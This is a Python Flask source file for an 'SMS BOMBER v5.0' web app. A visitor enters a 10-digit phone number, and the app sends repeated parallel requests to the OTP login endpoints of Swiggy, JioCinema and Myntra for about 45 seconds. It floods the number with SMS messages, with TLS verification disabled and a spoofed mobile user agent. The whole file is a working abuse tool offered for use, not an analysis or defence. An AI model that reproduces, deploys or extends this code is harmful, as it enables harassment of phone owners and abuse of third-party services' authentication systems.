import os
import time
import threading
import requests
import logging
from flask import Flask, request, jsonify, render_template_string
from concurrent.futures import ThreadPoolExecutor

# Render logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

SERVICES = [
    {"name": "Swiggy", "url": "https://www.swiggy.com/dapi/auth/send-otp", "payload": lambda n: {"mobile_no": n}},
    {"name": "JioCinema", "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request", "payload": lambda n: {"mobile": n, "countryCode": "91"}},
    {"name": "Myntra", "url": "https://www.myntra.com/ux/myntratracking/myntraotp", "payload": lambda n: {"loginId": n, "requestType": "LOGIN"}},
]

def send_sms(service, number):
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)'}
    try:
        resp = requests.post(service["url"], json=service["payload"](number), headers=headers, timeout=12, verify=False)
        logger.info(f"SMS [{service['name']}] {number} -> {resp.status_code}")
        return resp.status_code in [200, 201, 202]
    except:
        return False

def sms_bomber(number):
    logger.info(f"🚀=== SMS BOMBER STARTED: {number} ===")
    hits = 0
    total = 0
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        for i in range(12):  # 12 cycles ~ 45s
            logger.info(f"🔄 Cycle {i+1}/12")
            futures = [executor.submit(send_sms, svc, number) for svc in SERVICES]
            for future in futures:
                if future.result():
                    hits += 1
                total += 1
            time.sleep(4)
    
    logger.info(f"🏁 BOMBER COMPLETE: {hits}/{total} hits on {number} | {hits/total*100:.1f}%")

@app.route('/', methods=['GET'])
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head><title>SMS BOMBER</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:40px;text-align:center}
.box{border:2px solid #0f0;padding:40px;background:#111;border-radius:15px;display:inline-block}
input{width:300px;padding:15px;border:2px solid #0f0;background:#000;color:#0f0;font-size:18px}
button{padding:15px 40px;background:#0f0;color:#000;border:none;font-size:18px;cursor:pointer;font-weight:bold}
#log{margin-top:30px;padding:20px;border:1px solid #0f0;height:250px;overflow:auto;text-align:left;background:#000}
</style>
</head>
<body>
<div class="box">
<h1>💣 SMS BOMBER v5.0</h1>
<p>Render Optimized | Watch Logs Live 👇</p>
<input id="phone" placeholder="9876543210" maxlength="10">
<br><br>
<button onclick="go()">🚀 START SMS FLOOD</button>
<div id="log">Ready! Click button → Check Render Logs tab for SMS hits...</div>
</div>

<script>
async function go(){
    const num=document.getElementById('phone').value;
    if(num.length!==10) return alert('10 digits only!');
    
    document.querySelector('button').disabled=true;
    document.getElementById('log').innerHTML='🔥 Starting SMS flood...<br>📱 '+num+'<br>⏳ Check RENDER LOGS tab 👇';
    
    try{
        const r=await fetch('/sms-bomb',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({number:num})
        });
        const d=await r.json();
        document.getElementById('log').innerHTML+=
            `<br>✅ ${d.status}<br>📊 ${d.services} services<br>⏱️ ${d.duration}s<br>🔥 LOGS: ${d.hits}`;
    }catch(e){
        document.getElementById('log').innerHTML+='<br>❌ '+e.message;
    }
}
</script>
</body>
</html>
    """)

@app.route('/sms-bomb', methods=['POST'])
def sms_bomb():
    data = request.get_json() or {}
    number = data.get('number', '')
    
    if not (number.isdigit() and len(number) == 10):
        return jsonify({'error': 'Invalid 10-digit number'}), 400
    
    # Start bomber thread
    thread = threading.Thread(target=sms_bomber, args=(number,), daemon=True)
    thread.start()
    
    logger.info(f"🎯 TRIGGERED SMS BOMBER: {number}")
    
    return jsonify({
        'status': 'SMS flood started!',
        'target': number,
        'services': len(SERVICES),
        'duration': '45s',
        'hits': 'Check logs'
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
